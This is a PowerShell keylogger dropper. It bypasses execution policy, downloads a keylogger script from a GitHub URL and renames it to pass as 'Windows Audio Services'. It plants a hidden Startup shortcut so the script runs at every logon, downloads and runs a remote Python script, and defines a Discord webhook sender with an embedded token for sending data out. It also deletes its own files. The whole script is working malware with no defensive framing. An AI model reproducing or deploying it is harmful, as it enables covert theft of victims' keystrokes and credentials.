# Set Execution Policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Define the path to the Startup folder
$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')

# Define the path for the shortcut
$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'Windows Audio Services.lnk')

# Function to check for an active network connection
function Test-NetworkConnection {
    $pingResult = Test-Connection -ComputerName google.com -Count 1 -Quiet
    return $pingResult
}

# Wait for an active network connection
while (-Not (Test-NetworkConnection)) {
    Write-Output "Waiting for network connection..."
    Start-Sleep -Seconds 5
}

# Check if the shortcut exists
if (Test-Path $shortcutPath) {
    Write-Output "Shortcut exists at $shortcutPath"
} else {
    Write-Output "Shortcut does not exist at $shortcutPath"

    # Path to the keylogger script
    $keyloggerScriptPath = "$env:TEMP\keylogger.ps1"
    $renamedScriptPath = "$env:TEMP\Windows Audio Services.ps1"

    # URL to the keylogger script on GitHub
    $keyloggerScriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/main/Keylogger.ps1"

    # Download the keylogger script from GitHub
    Invoke-WebRequest -Uri $keyloggerScriptUrl -OutFile $keyloggerScriptPath

    # Rename the keylogger script
    Rename-Item -Path $keyloggerScriptPath -NewName $renamedScriptPath

    # Create a WScript.Shell COM object
    $wshShell = New-Object -ComObject WScript.Shell

    # Create the shortcut
    $shortcut = $wshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = 'powershell.exe'
    $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$renamedScriptPath`"" 
    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($renamedScriptPath)
    $shortcut.Save()

    Write-Output "Shortcut created at $shortcutPath"
}

# Function to clean up PowerShell scripts in the temp directory
function Cleanup-TempScripts {
    Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
}

# Function to send a message to Discord webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )
    $webhookUrl = "https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY6Qkbc_KZhn2BXVufmLDGAbM0m1m28kbK8cvwlcakiwViAQtrMKO_BA95"
    $payload = @{
        content = $message
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
}

# Trap to handle script termination and perform cleanup
trap { Cleanup-TempScripts; break }

# Check if Python is installed
if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Output "Python is not installed. Installing Python using Chocolatey..."

    # Install Chocolatey if it is not installed
    if (-Not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    }

    # Install Python using Chocolatey
    choco install python -y
    $env:Path += ";$env:ProgramFiles\Python39\Scripts;$env:ProgramFiles\Python39"
}

$pythonScriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/main/elog.py"
$localPythonScriptPath = "$env:TEMP\elog.py"
$logFilePath = "$env:TEMP\log.txt"

if (-Not (Test-Path $logFilePath)) { New-Item -Path $logFilePath -ItemType File }

try {
    Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $localPythonScriptPath
    $pythonProcess = Start-Process -FilePath "python" -ArgumentList $localPythonScriptPath -NoNewWindow -PassThru
    $pythonProcess.WaitForExit()
}
finally {
    if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
    if (Test-Path $localPythonScriptPath) { Remove-Item -Path $localPythonScriptPath }
    
    # Remove the shortcut if it exists
    if (Test-Path $shortcutPath) {
        Remove-Item -Path $shortcutPath -Force
        Write-Output "Shortcut removed from $shortcutPath"
    } else {
        Write-Output "Shortcut does not exist at $shortcutPath"
    }

    # Remove the keylogger script if it exists
    if (Test-Path $renamedScriptPath) {
        Remove-Item -Path $renamedScriptPath -Force
        Write-Output "Keylogger script removed from $renamedScriptPath"
    } else {
        Write-Output "Keylogger script does not exist at $renamedScriptPath"
    }

    Cleanup-TempScripts
}

# Ensure the script terminates last
Start-Sleep -Seconds 2
Write-Output "Cleanup completed. Exiting PowerShell script."

# Exit the PowerShell session
exit
